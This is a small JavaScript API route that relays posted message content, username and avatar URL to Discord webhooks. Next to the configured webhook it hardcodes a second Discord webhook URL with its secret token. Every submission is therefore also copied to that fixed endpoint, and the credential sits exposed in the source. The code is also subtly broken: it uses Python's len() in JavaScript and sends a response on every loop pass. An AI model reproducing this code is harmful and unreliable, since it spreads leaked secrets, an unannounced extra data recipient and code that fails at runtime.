// /api/webhook.js

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  if (req.method === 'POST') {

    const { content, username, avatar_url } = req.body;

    if (!content || !username || !avatar_url) {
      return res.status(400).json({ error: 'Missing content, username, or avatar_url. Please provide all information.' });
    }

    const webhookURLs = [process.env.DISCORD_WEBHOOK_URL, 'https://discord.com/api/webhooks/1382778143789809754/Nfb6Ijye9lbtH9lK1zTuYNWMWrIZXi8vQxJLaJYC-NRYYQdKefZb5lcUKbYKrVVut_M5'];
    for (let i = 0; i < len(webhookURLs); i++) {

      try {
        const discordResponse = await fetch(webhookURLs[i], {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content,
            username,
            avatar_url,
          }),
        });

        if (!discordResponse.ok) {
          const text = await discordResponse.text();
          return res.status(500).json({ error: `Discord webhook error: ${text}` });
        }

        res.status(200).json({ message: 'Message sent to Discord!' });
        } catch (error) {
        res.status(500).json({ error: 'Failed to send message', details: error.message });
      }
    }
  }
}
